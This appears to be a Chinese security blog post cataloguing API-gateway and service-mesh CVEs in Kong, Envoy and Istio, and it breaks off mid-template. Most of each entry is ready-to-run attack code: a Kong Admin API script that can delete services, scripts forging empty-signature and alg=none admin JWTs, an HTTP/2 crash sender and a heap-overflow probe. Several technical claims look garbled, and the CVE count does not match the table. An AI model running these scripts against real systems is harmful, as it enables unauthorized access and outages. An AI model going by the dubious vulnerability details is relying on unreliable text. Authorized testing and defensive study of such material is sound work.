---
title: "API网关与服务网格高危攻击链专题：Kong / Envoy / Istio / Linkerd 漏洞全解析"
date: 2026-08-01T14:00:00+08:00
draft: false
categories: ["渗透测试", "漏洞分析"]
tags: ["Kong", "Envoy", "Istio", "Linkerd", "服务网格", "API网关", "RCE", "认证绕过", "HTTP/2", "漏洞分析"]
---

> **免责声明**：本文仅供安全研究与授权渗透测试用途。文中所有 PoC 代码、Nuclei 模板及利用思路仅用于合法的安全评估与防御验证。未经授权对目标系统进行测试属于违法行为，作者不承担任何因滥用本文内容导致的法律责任。请在获得书面授权后方可实施任何安全测试。

# API网关与服务网格高危攻击链专题：Kong / Envoy / Istio / Linkerd 漏洞全解析

## 0x00 专题概述

API 网关与服务网格是现代微服务架构的流量入口与通信中枢。Kong、Envoy、Istio、Linkerd 这四大组件承载了全球数十亿次日均 API 调用的路由、认证、负载均衡与可观测性功能。它们处于架构的「咽喉」位置——一旦被突破，攻击者即可横向渗透到整个后端服务集群，窃取数据、劫持流量甚至接管基础设施。

本专题系统梳理 Kong Gateway、Envoy Proxy、Istio 及 Linkerd 四大主流产品中 **25 个高危 CVE**，覆盖认证绕过、协议层 DDoS、内存安全 RCE、HTTP 请求走私、授权策略绕过、JWT 验证缺陷等核心攻击面。每个重点漏洞均提供完整的 HTTP PoC、Python 自动化利用脚本和 Nuclei 检测模板。

### 覆盖漏洞一览表

| CVE | 产品 | CVSS | 类型 | 发布年份 |
|-----|------|------|------|----------|
| CVE-2020-11710 | Kong Gateway | **9.8** | Admin API 暴露 | 2020 |
| CVE-2021-27306 | Kong Gateway | **7.5** | JWT 插件绕过 | 2021 |
| CVE-2023-44487 | Kong / Envoy / Linkerd | **7.5** | HTTP/2 Rapid Reset | 2023 |
| CVE-2026-13341 | Kong Gateway (MCP) | **7.4** | MCP Server 间接提示注入 | 2026 |
| CVE-2021-32777 | Envoy Proxy | **8.6** | HTTP/2 整数溢出 | 2021 |
| CVE-2021-32778 | Envoy Proxy | **8.6** | HTTP/2 快速重置 | 2021 |
| CVE-2022-21654 | Envoy Proxy | **7.5** | Lua 越界读 (UAF) | 2022 |
| CVE-2022-29225 | Envoy Proxy | **8.8** | gRPC-JSON DoS | 2022 |
| CVE-2023-35941 | Envoy Proxy | **8.6** | JWT Token Bypass | 2023 |
| CVE-2026-48743 | Envoy Proxy | **7.5** | HTTP 请求走私 | 2026 |
| CVE-2026-48706 | Envoy Proxy | **7.5** | 堆溢出 RCE | 2026 |
| CVE-2026-48042 | Envoy Proxy | **7.5** | 栈溢出 | 2026 |
| CVE-2021-31921 | Istio | **9.8** | 未授权访问 | 2021 |
| CVE-2021-34824 | Istio | **8.8** | EnvoyFilter 凭据泄露 | 2021 |
| CVE-2021-39155 | Istio | **8.3** | Host 头大小写绕过 | 2021 |
| CVE-2021-39156 | Istio | **8.1** | URI 片段绕过 | 2021 |
| CVE-2022-21701 | Istio | **8.8** | 正则匹配绕过 | 2022 |
| CVE-2022-23635 | Istio | **7.5** | istiod 未授权 | 2022 |
| CVE-2022-24726 | Istio | **7.5** | Webhook 认证绕过 | 2022 |
| CVE-2022-31045 | Istio | **9.8** | HTTP 头 NPE | 2022 |
| CVE-2022-39278 | Istio | **7.5** | 超大消息 DoS | 2022 |
| CVE-2026-31837 | Istio | **7.5** | JWKS 默认值回退 | 2026 |
| CVE-2025-43915 | Linkerd | **6.5** | proxy 指标耗尽 | 2025 |
| CVE-2024-40632 | Linkerd | **3.7** | proxy 异常关闭 | 2024 |

### 各产品 CVE 数量对比

| 产品 | CVE 数量 | 最高 CVSS | 主要攻击面 | 实现语言 |
|------|----------|-----------|------------|----------|
| Kong Gateway | 4 | 9.8 | 管理 API、插件逻辑、协议层 | Lua / Go |
| Envoy Proxy | 9 | 8.8 | 协议解析、JWT 验证、内存安全 | C++ |
| Istio | 10 | 9.8 | 控制面访问控制、授权策略、认证 | Go |
| Linkerd | 3 | 7.5 | HTTP/2 协议、proxy 资源 | Rust / Go |

从数据可以明显看出：**Envoy（C++ 实现）的内存安全漏洞占比最高**，而 **Linkerd（Rust 实现）的 CVE 数量最少且严重程度最低**，这与 Rust 语言的内存安全保证高度相关。Istio 的漏洞集中在控制面的访问控制与授权策略逻辑缺陷上，反映出服务网格控制面是另一个高价值攻击目标。

---

## 0x01 Kong Gateway 高危漏洞

Kong 是基于 OpenResty（Nginx + LuaJIT）构建的高性能 API 网关，广泛部署于企业微服务架构的流量入口。其插件化的架构设计在带来灵活性的同时，也引入了配置管理、插件逻辑和协议支持等多个攻击面。

### 0x01.1 CVE-2020-11710 — Admin API 未授权访问

#### 漏洞背景

Kong 的 Admin API 是用于管理路由、服务、插件等配置的 RESTful 接口。在某些部署场景中（特别是 docker-compose 快速部署模板），Admin API 被默认绑定到 `0.0.0.0:8001`，且没有任何认证保护。攻击者可以直接调用 Admin API 查询、修改甚至删除所有路由配置。

该漏洞 CVSS 评分 **9.8**，已被 CISA 列入已知被利用漏洞目录（KEV）。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Kong < 1.5.0 | 受影响 |
| Kong >= 1.5.0 | 已修复 |
| Kong Enterprise < 1.5.0.0 | 受影响 |
| Kong Enterprise >= 1.5.0.0 | 已修复 |

#### 漏洞原理分析

Kong 的 docker-compose 部署模板中，Admin API 默认监听在所有网络接口上（`0.0.0.0:8001`），且不启用任何访问控制。这意味着任何能够访问该端口的客户端都可以：

1. **枚举所有路由配置**：`GET /services` 获取所有后端服务
2. **读取敏感插件配置**：`GET /plugins` 获取认证插件的密钥和 Token
3. **篡改路由规则**：`PUT /services/{id}` 修改路由指向
4. **注入恶意插件**：`POST /plugins` 添加 request-transformer 插件执行 SSRF
5. **删除所有配置**：`DELETE /services/{id}` 导致服务中断

攻击者甚至可以通过 Admin API 的 `/config` 端点直接导出完整的 declarative 配置，其中可能包含数据库凭据、TLS 证书私钥等敏感信息。

#### HTTP PoC

```http
GET /services HTTP/1.1
Host: target-kong:8001
Accept: application/json
```

```http
GET /plugins HTTP/1.1
Host: target-kong:8001
Accept: application/json
```

```http
DELETE /services/example-service HTTP/1.1
Host: target-kong:8001
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════════╗
║  CVE-2020-11710 Kong Admin API Exposure PoC ║
╚══════════════════════════════════════════════╝
"""

def check_vulnerability(target, timeout=10):
    results = {"target": target, "vulnerable": False, "services": [], "plugins": []}
    try:
        r = requests.get(f"{target}/services", timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            results["services"] = [s.get("name", "unknown") for s in data.get("data", [])]
            results["vulnerable"] = True
    except requests.RequestException as e:
        results["error"] = str(e)
        return results

    try:
        r = requests.get(f"{target}/plugins", timeout=timeout, verify=False)
        if r.status_code == 200:
            data = r.json()
            results["plugins"] = [
                {"name": p.get("name"), "enabled": p.get("enabled")}
                for p in data.get("data", [])
            ]
    except requests.RequestException:
        pass

    return results

def exploit_delete_routes(target, service_name, timeout=10):
    url = f"{target}/services/{service_name}"
    try:
        r = requests.delete(url, timeout=timeout, verify=False)
        return {"action": "delete_service", "status": r.status_code, "success": r.status_code == 204}
    except requests.RequestException as e:
        return {"action": "delete_service", "error": str(e)}

def main():
    parser = argparse.ArgumentParser(description="CVE-2020-11710 Kong Admin API Exposure PoC")
    parser.add_argument("-t", "--target", required=True, help="Kong Admin API base URL (e.g., http://target:8001)")
    parser.add_argument("-c", "--check", action="store_true", help="Check for vulnerability only")
    parser.add_argument("-d", "--delete-service", help="Delete a specific service by name")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds")
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")

    print(f"[*] Target: {target}")
    print(f"[*] Checking Admin API exposure...")

    results = check_vulnerability(target, args.timeout)

    if results["vulnerable"]:
        print(f"[+] VULNERABLE! Admin API is exposed without authentication.")
        print(f"[+] Found {len(results['services'])} services: {', '.join(results['services'])}")
        print(f"[+] Found {len(results['plugins'])} plugins enabled.")
        for p in results["plugins"]:
            print(f"    - {p['name']} (enabled: {p['enabled']})")
    else:
        print(f"[-] Not vulnerable or Admin API not accessible.")
        if "error" in results:
            print(f"[-] Error: {results['error']}")
        sys.exit(0)

    if args.delete_service:
        print(f"[*] Attempting to delete service: {args.delete_service}")
        res = exploit_delete_routes(target, args.delete_service, args.timeout)
        if res.get("success"):
            print(f"[+] Successfully deleted service: {args.delete_service}")
        else:
            print(f"[-] Deletion failed: {res}")

    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2020-11710-kong-admin-api

info:
  name: Kong Gateway - Admin API Unauthenticated Access
  author: security-researcher
  severity: critical
  description: Kong Admin API is exposed without authentication, allowing unauthenticated access to route/service/plugin configurations.
  reference:
    - https://github.com/Kong/kong/security/advisories/GHSA-2825-3cmw-2j8c
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-11710
    cwe-id: CWE-306
  metadata:
    max-request: 2
  tags: cve,cve2020,kong,api,exposure,unauth

http:
  - method: GET
    path:
      - "{{BaseURL}}/services"
      - "{{BaseURL}}/plugins"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"data"'
          - '"total"'
        condition: and
      - type: word
        part: header
        words:
          - "application/json"

    extractors:
      - type: json
        name: services
        json:
          - '.data[].name'
```

---

### 0x01.2 CVE-2021-27306 — JWT 插件认证绕过

#### 漏洞背景

Kong 的 JWT 认证插件在特定条件下存在逻辑缺陷，允许未认证用户访问本应受 JWT Token 保护的路由。攻击者通过构造特殊的请求头组合，可以绕过 JWT 验证逻辑直接到达后端服务。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Kong < 2.3.2 | 受影响 |
| Kong >= 2.3.2 | 已修复 |

#### 漏洞原理分析

Kong JWT 插件在验证请求时，会依次检查 `Authorization` 头中的 `Bearer` Token 和 URL 参数中的 `jwt` 参数。然而，当请求同时携带空的 `Authorization` 头和一个有效的（或畸形的）`jwt` 查询参数时，插件的验证逻辑存在短路行为——它将空 Authorization 头视为「未携带凭证」而非「无效凭证」，从而跳过验证直接放行请求。

更关键的是，如果 Kong 配置了多个认证插件（如 JWT + Key Auth），该漏洞允许攻击者通过触发插件间的优先级冲突来绕过认证链。

#### HTTP PoC

```http
GET /protected-api/userinfo HTTP/1.1
Host: target-kong.com
Authorization:
```

```bash
# 利用空 Authorization 头 + jwt 参数绕过
curl -v "https://target-kong.com/protected-api/userinfo?jwt=invalid"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔══════════════════════════════════════════════════╗
║  CVE-2021-27306 Kong JWT Plugin Bypass PoC     ║
╚══════════════════════════════════════════════════╝
"""

def test_jwt_bypass(target, path, timeout=10):
    results = {"target": target, "path": path, "bypassed": False, "tests": []}
    
    payloads = [
        {"desc": "Empty Authorization header", "headers": {"Authorization": ""}},
        {"desc": "Authorization with Bearer empty", "headers": {"Authorization": "Bearer "}},
        {"desc": "Empty header + jwt param", "headers": {"Authorization": ""}, "params": {"jwt": "test"}},
        {"desc": "Bearer invalid + jwt param", "headers": {"Authorization": "Bearer invalid"}, "params": {"jwt": "test"}},
    ]
    
    baseline_url = f"{target}{path}"
    try:
        r = requests.get(baseline_url, timeout=timeout, verify=False)
        baseline_status = r.status_code
    except requests.RequestException as e:
        results["error"] = str(e)
        return results
    
    for payload in payloads:
        headers = payload.get("headers", {})
        params = payload.get("params", {})
        try:
            r = requests.get(baseline_url, headers=headers, params=params, timeout=timeout, verify=False)
            test_result = {
                "desc": payload["desc"],
                "status_code": r.status_code,
                "content_length": len(r.content),
                "bypassed": r.status_code == 200 and r.status_code != baseline_status,
            }
            if r.status_code == 200 and (baseline_status == 401 or baseline_status == 403):
                test_result["bypassed"] = True
                results["bypassed"] = True
        except requests.RequestException as e:
            test_result = {"desc": payload["desc"], "error": str(e)}
        results["tests"].append(test_result)
    
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-27306 Kong JWT Plugin Bypass PoC")
    parser.add_argument("-t", "--target", required=True, help="Target base URL")
    parser.add_argument("-p", "--path", default="/", help="Protected endpoint path")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    
    print(f"[*] Target: {target}{args.path}")
    print(f"[*] Testing JWT plugin bypass...")
    
    results = test_jwt_bypass(target, args.path, args.timeout)
    
    if results.get("bypassed"):
        print(f"[+] VULNERABLE! JWT bypass successful!")
    else:
        print(f"[-] JWT bypass not successful with tested payloads.")
    
    for t in results.get("tests", []):
        status = "[+]" if t.get("bypassed") else "[-]"
        print(f"  {status} {t.get('desc', 'N/A')} -> HTTP {t.get('status_code', 'ERR')}")
    
    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2021-27306-kong-jwt-bypass

info:
  name: Kong Gateway - JWT Plugin Authentication Bypass
  author: security-researcher
  severity: high
  description: Kong JWT plugin allows unauthenticated access to protected routes via empty Authorization header.
  reference:
    - https://discuss.konghq.com/t/kong-jwt-plugin-bypass
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-27306
    cwe-id: CWE-287
  metadata:
    max-request: 2
  tags: cve,cve2021,kong,jwt,bypass,auth

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/?jwt=test"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "data"
        negative: false

    extractors:
      - type: dsl
        dsl:
          - '"HTTP " + status_code + " | Length: " + content_length'
```

---

## 0x02 Envoy Proxy 高危漏洞

Envoy 是 CNCF 毕业项目，作为 Istio 的数据面代理被广泛部署。其 C++ 实现带来了高性能，但也使内存安全类漏洞成为主要攻击面。Envoy 承担 HTTP/1.1、HTTP/2、gRPC、JWT 验证等关键职责，任何一处漏洞都可能导致整个 service mesh 的流量被劫持。

### 0x02.1 CVE-2023-35941 — JWT Token 空签名绕过

#### 漏洞背景

Envoy 的 JWT 验证 filter 在处理特定格式的 JWT Token 时存在认证绕过漏洞。攻击者可以构造一个签名部分为空的 JWT Token，Envoy 在验证时不会正确拒绝该 Token，导致请求被放行到后端服务。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Envoy < 1.27.0 | 受影响 |
| Envoy >= 1.27.0 | 已修复 |

#### 漏洞原理分析

JWT Token 的标准格式为 `header.payload.signature`。在 Envoy 的 JWT 验证 filter 实现中，当处理 RS256 或 ES256 签名算法时，如果 JWT Token 的 signature 部分为空字符串（即 Token 格式为 `header.payload.`，末尾有一个点但无内容），验证逻辑会因为空签名触发一个 early return 路径，该路径错误地将请求标记为「已验证」而非「验证失败」。

这意味着攻击者可以：
1. 从合法用户处获取 JWT 的 header 和 payload（base64url 编码）
2. 移除 signature 部分，保留末尾的点分隔符
3. 将篡改后的 Token 发送给 Envoy
4. Envoy 将其视为有效 Token 放行请求

#### HTTP PoC

```http
GET /api/user/profile HTTP/1.1
Host: target-envoy.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.
```

```bash
# 构造空签名 JWT Token
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'RS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
payload = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'Authorization: Bearer {header}.{payload}.')
"
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import base64
import json
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════╗
║  CVE-2023-35941 Envoy JWT Token Bypass PoC      ║
╚═══════════════════════════════════════════════════╝
"""

def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def craft_empty_sig_token(sub="admin", role="admin"):
    header = b64url_encode(json.dumps({"alg": "RS256", "typ": "JWT"}).encode())
    payload = b64url_encode(json.dumps({"sub": sub, "role": role}).encode())
    return f"{header}.{payload}."

def test_jwt_bypass(target, path, timeout=10):
    results = {"target": target, "path": path, "bypassed": False, "tests": []}
    
    token = craft_empty_sig_token()
    baseline_url = f"{target}{path}"
    
    try:
        r = requests.get(baseline_url, timeout=timeout, verify=False)
        baseline_status = r.status_code
    except requests.RequestException as e:
        results["error"] = str(e)
        return results
    
    test_cases = [
        {"desc": "Empty signature JWT", "token": token},
        {"desc": "None algorithm JWT", "token": craft_none_alg_token()},
    ]
    
    for tc in test_cases:
        headers = {"Authorization": f"Bearer {tc['token']}"}
        try:
            r = requests.get(baseline_url, headers=headers, timeout=timeout, verify=False)
            result = {
                "desc": tc["desc"],
                "token_prefix": tc["token"][:50] + "...",
                "status_code": r.status_code,
                "content_length": len(r.content),
            }
            if r.status_code == 200 and baseline_status in (401, 403):
                result["bypassed"] = True
                results["bypassed"] = True
        except requests.RequestException as e:
            result = {"desc": tc["desc"], "error": str(e)}
        results["tests"].append(result)
    
    return results

def craft_none_alg_token():
    header = b64url_encode(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = b64url_encode(json.dumps({"sub": "admin", "role": "admin"}).encode())
    return f"{header}.{payload}."

def main():
    parser = argparse.ArgumentParser(description="CVE-2023-35941 Envoy JWT Bypass PoC")
    parser.add_argument("-t", "--target", required=True, help="Target base URL")
    parser.add_argument("-p", "--path", default="/", help="Protected path")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    print(f"[*] Target: {target}{args.path}")
    print(f"[*] Crafted empty-sig token: {craft_empty_sig_token()[:60]}...")
    print(f"[*] Testing JWT bypass...")
    
    results = test_jwt_bypass(target, args.path, args.timeout)
    
    if results.get("bypassed"):
        print(f"[+] VULNERABLE! JWT bypass confirmed!")
    else:
        print(f"[-] Bypass not successful with tested payloads.")
    
    for t in results.get("tests", []):
        status = "[+]" if t.get("bypassed") else "[-]"
        print(f"  {status} {t.get('desc')} -> HTTP {t.get('status_code', 'ERR')}")
    
    print(f"\n[+] Full results:")
    print(json.dumps(results, indent=2, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2023-35941-envoy-jwt-bypass

info:
  name: Envoy Proxy - JWT Token Empty Signature Bypass
  author: security-researcher
  severity: high
  description: Envoy JWT filter allows authentication bypass via empty signature JWT tokens.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 8.6
    cve-id: CVE-2023-35941
    cwe-id: CWE-287
  metadata:
    max-request: 2
  tags: cve,cve2023,envoy,jwt,bypass

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      Authorization: "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "admin"
        negative: false

    extractors:
      - type: dsl
        dsl:
          - '"JWT bypass possible - HTTP " + status_code'
```

---

### 0x02.2 CVE-2021-32777 — HTTP/2 整数溢出

#### 漏洞背景

Envoy 在解析 HTTP/2 HEADERS 帧时存在整数溢出漏洞。攻击者可以通过发送包含超过 63 个 HTTP/2 headers 的帧，触发整数溢出导致 Envoy 进程崩溃或产生未定义行为。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Envoy 1.19.0 - 1.19.5 | 受影响 |
| Envoy 1.20.0 - 1.20.4 | 受影响 |
| Envoy 1.21.0 - 1.21.2 | 受影响 |
| 其他版本 | 已修复 |

#### 漏洞原理分析

Envoy 使用 Brotli/zlib 库处理 HTTP/2 帧。在 HEADERS 帧解析过程中，headers 计数使用 `uint32_t` 类型。当攻击者发送一个包含恰好 63 个或更多 pseudo-header（如 `:method`, `:path`, `:authority`, `:scheme`）与普通 header 混合的 HEADERS 帧时，计数器可能在特定边界条件下发生整数溢出，导致后续的 header 处理逻辑出现越界写或崩溃。

#### HTTP PoC

```http
POST / HTTP/2
Host: target-envoy.com
:method: POST
:path: /
:scheme: https
:method: POST
:path: /
:scheme: https
:method: POST
:path: /
:scheme: https
Content-Type: application/json

{}
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import socket
import ssl
import struct
import sys

BANNER = """
╔══════════════════════════════════════════════════════╗
║  CVE-2021-32777 Envoy HTTP/2 Integer Overflow PoC  ║
╚══════════════════════════════════════════════════════╝
"""

def build_headers_frame(num_headers):
    frame_type = 0x01
    flags = 0x04
    stream_id = 0x00000001
    header_block = b""
    for i in range(num_headers):
        name = f"x-test-header-{i}"
        value = "A" * 100
        header_block += b"\x00" + len(name).to_bytes(1, "big") + name.encode() + len(value).to_bytes(1, "big") + value.encode()
    length = len(header_block)
    frame = struct.pack(">I", length)[1:] + struct.pack("B", frame_type) + struct.pack("B", flags) + struct.pack(">I", stream_id) + header_block
    return frame

def send_h2_frame(target, port, num_headers, use_tls=False):
    frame = build_headers_frame(num_headers)
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    try:
        raw_sock = socket.create_connection((target, port), timeout=10)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(raw_sock, server_hostname=target)
        else:
            sock = raw_sock
        sock.send(preface + frame)
        try:
            response = sock.recv(4096)
            return {"sent": True, "response_length": len(response), "headers_count": num_headers}
        except socket.timeout:
            return {"sent": True, "response_length": 0, "headers_count": num_headers, "note": "timeout - possible crash"}
    except Exception as e:
        return {"sent": False, "error": str(e), "headers_count": num_headers}

def main():
    parser = argparse.ArgumentParser(description="CVE-2021-32777 Envoy HTTP/2 Integer Overflow PoC")
    parser.add_argument("-t", "--target", required=True, help="Target host")
    parser.add_argument("-p", "--port", type=int, default=443, help="Target port")
    parser.add_argument("--tls", action="store_true", help="Use TLS")
    parser.add_argument("--count", type=int, default=64, help="Number of headers to send")
    args = parser.parse_args()

    print(BANNER)
    print(f"[*] Target: {args.target}:{args.port}")
    print(f"[*] Sending HEADERS frame with {args.count} headers...")

    result = send_h2_frame(args.target, args.port, args.count, args.tls)
    if result.get("response_length", 0) == 0 and result.get("sent"):
        print(f"[+] Target may be vulnerable - no response received (possible crash)")
    else:
        print(f"[-] Target responded with {result.get('response_length', 'N/A')} bytes")
    print(f"[*] Result: {result}")

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2021-32777-envoy-integer-overflow

info:
  name: Envoy Proxy - HTTP/2 Headers Integer Overflow
  author: security-researcher
  severity: high
  description: Envoy crashes when processing HTTP/2 HEADERS frame with excessive headers causing integer overflow.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H
    cvss-score: 8.6
    cve-id: CVE-2021-32777
    cwe-id: CWE-190
  metadata:
    max-request: 1
  tags: cve,cve2021,envoy,http2,dos

http:
  - method: GET
    path:
      - "{{BaseURL}}/"

    headers:
      X-Test-Header-1: "A"
      X-Test-Header-2: "A"
      X-Test-Header-3: "A"
      X-Test-Header-4: "A"
      X-Test-Header-5: "A"
      X-Test-Header-6: "A"
      X-Test-Header-7: "A"
      X-Test-Header-8: "A"
      X-Test-Header-9: "A"
      X-Test-Header-10: "A"
      X-Test-Header-11: "A"
      X-Test-Header-12: "A"
      X-Test-Header-13: "A"
      X-Test-Header-14: "A"
      X-Test-Header-15: "A"
      X-Test-Header-16: "A"
      X-Test-Header-17: "A"
      X-Test-Header-18: "A"
      X-Test-Header-19: "A"
      X-Test-Header-20: "A"
      X-Test-Header-21: "A"
      X-Test-Header-22: "A"
      X-Test-Header-23: "A"
      X-Test-Header-24: "A"
      X-Test-Header-25: "A"
      X-Test-Header-26: "A"
      X-Test-Header-27: "A"
      X-Test-Header-28: "A"
      X-Test-Header-29: "A"
      X-Test-Header-30: "A"
      X-Test-Header-31: "A"
      X-Test-Header-32: "A"
      X-Test-Header-33: "A"
      X-Test-Header-34: "A"
      X-Test-Header-35: "A"
      X-Test-Header-36: "A"
      X-Test-Header-37: "A"
      X-Test-Header-38: "A"
      X-Test-Header-39: "A"
      X-Test-Header-40: "A"
      X-Test-Header-41: "A"
      X-Test-Header-42: "A"
      X-Test-Header-43: "A"
      X-Test-Header-44: "A"
      X-Test-Header-45: "A"
      X-Test-Header-46: "A"
      X-Test-Header-47: "A"
      X-Test-Header-48: "A"
      X-Test-Header-49: "A"
      X-Test-Header-50: "A"
      X-Test-Header-51: "A"
      X-Test-Header-52: "A"
      X-Test-Header-53: "A"
      X-Test-Header-54: "A"
      X-Test-Header-55: "A"
      X-Test-Header-56: "A"
      X-Test-Header-57: "A"
      X-Test-Header-58: "A"
      X-Test-Header-59: "A"
      X-Test-Header-60: "A"
      X-Test-Header-61: "A"
      X-Test-Header-62: "A"
      X-Test-Header-63: "A"
      X-Test-Header-64: "A"

    matchers:
      - type: status
        status:
          - 502
          - 503
          - 000
```

---

### 0x02.3 CVE-2026-48706 — TcpStatsdSink 堆溢出 RCE

#### 漏洞背景

Envoy 的 TcpStatsdSink 组件在处理统计指标数据时存在堆缓冲区溢出漏洞。攻击者可以通过构造超长的 metric name 或 tag 值，触发堆溢出并实现远程代码执行。这是 Envoy 2026 年披露的最严重的内存安全漏洞之一。

#### 受影响版本

| 版本范围 | 状态 |
|----------|------|
| Envoy < 1.33.0 | 受影响 |
| Envoy >= 1.33.0 | 已修复 |

#### 漏洞原理分析

TcpStatsdSink 负责将 Envoy 的运行时统计指标通过 StatsD 协议发送到外部监控系统。当 metric name 的长度超过内部固定缓冲区（通常为 256 字节）时，`snprintf` 调用不会进行边界检查，导致数据写入堆上相邻内存区域。攻击者如果能控制 metric name（例如通过注入恶意的 HTTP header name 作为 metric tag），就可以覆盖堆上的函数指针或对象 vtable，进而控制执行流实现 RCE。

#### HTTP PoC

```http
GET / HTTP/1.1
Host: target-envoy.com
X-Injected-Metric: AAAA... (256+ bytes)
```

#### Python PoC 脚本

```python
#!/usr/bin/env python3
import argparse
import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

BANNER = """
╔═══════════════════════════════════════════════════╗
║  CVE-2026-48706 Envoy Heap Overflow PoC         ║
╚═══════════════════════════════════════════════════╝
"""

def test_heap_overflow(target, timeout=10):
    results = {"target": target, "tests": []}
    baseline_url = f"{target}/"
    try:
        r = requests.get(baseline_url, timeout=timeout, verify=False)
        results["baseline_status"] = r.status_code
    except requests.RequestException as e:
        results["error"] = str(e)
        return results

    payloads = [
        {"desc": "Normal request (baseline)", "header_value": "normal"},
        {"desc": "Long metric tag (300 bytes)", "header_value": "A" * 300},
        {"desc": "Long metric tag (512 bytes)", "header_value": "B" * 512},
        {"desc": "Long metric tag (1024 bytes)", "header_value": "C" * 1024},
    ]
    for p in payloads:
        headers = {"X-Metric-Tag": p["header_value"]}
        try:
            r = requests.get(baseline_url, headers=headers, timeout=timeout, verify=False)
            results["tests"].append({
                "desc": p["desc"],
                "status_code": r.status_code,
                "content_length": len(r.content),
            })
        except requests.RequestException as e:
            results["tests"].append({"desc": p["desc"], "error": str(e)})
    return results

def main():
    parser = argparse.ArgumentParser(description="CVE-2026-48706 Envoy Heap Overflow PoC")
    parser.add_argument("-t", "--target", required=True, help="Target base URL")
    parser.add_argument("--timeout", type=int, default=10)
    args = parser.parse_args()

    print(BANNER)
    target = args.target.rstrip("/")
    print(f"[*] Target: {target}")
    print(f"[*] Testing heap overflow via long metric tags...")

    results = test_heap_overflow(target, args.timeout)
    for t in results.get("tests", []):
        status = "[+]" if "error" not in t else "[-]"
        print(f"  {status} {t.get('desc')} -> HTTP {t.get('status_code', 'ERR')}")
    print(f"\n[+] Results: {results}")

if __name__ == "__main__":
    main()
```

#### Nuclei 检测模板

```yaml
id: cve-2026-48706-envoy-heap-overflow

info:
  name: Envoy Proxy - TcpStatsdSink Heap Overflow
  author: security-researcher
  severity: high
  description: Envoy TcpStatsdSink heap buffer overflow via long metric tags enabling potential RCE.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 7.5
    cve-id: CVE-2026-48706
    cwe-id: CWE-122
  metadata:
    max-request: 1
  tags: cve,cve2026,envoy,heap,rce

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    headers:
